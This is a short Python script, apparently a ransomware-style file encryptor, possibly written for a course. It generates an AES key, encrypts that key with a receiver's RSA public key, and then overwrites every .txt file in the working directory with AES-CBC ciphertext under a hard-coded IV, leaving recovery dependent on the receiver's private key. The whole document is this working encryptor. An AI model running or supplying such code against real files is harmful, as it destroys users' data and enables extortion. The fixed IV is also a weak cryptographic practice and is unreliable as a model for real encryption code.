#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import glob

# k = symmetric key
# pk = receiver public key
# Ck = encrypted symmetric key

# generate symmetric key
k = get_random_bytes(16)
#print("k:", k)

# reads the public key of the receiver from a file named "receiver.pem."
pk = RSA.import_key(open("receiver.pem").read())
# pk = RSA.import_key(open("receiver.pem2").read())

file_out = open("Ck.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(pk)
Ck = cipher_rsa.encrypt(k)
file_out.write(Ck)
file_out.close()

# M = message, CM = ciphertext
# encrypt message M using symmetric key through symmetric encryption
for file in glob.glob("*.txt"):	
	textfile = open(file, "rb")
	plaintext = textfile.read()
	iv = b'\x85\xf2\xf5\x84\xa0y!#t\xdf\xeb\xa2u\x9b\xabp'
	cipher = AES.new(k, AES.MODE_CBC, iv)
	CM_bytes = cipher.encrypt(pad(plaintext, AES.block_size))
	CM = b64encode(CM_bytes).decode('utf-8')
	
	textfile.close()
	
	textfile = open(file, "w")
	textfile.write(CM)
	
	textfile.close()			

print()
print("Encryption completed")
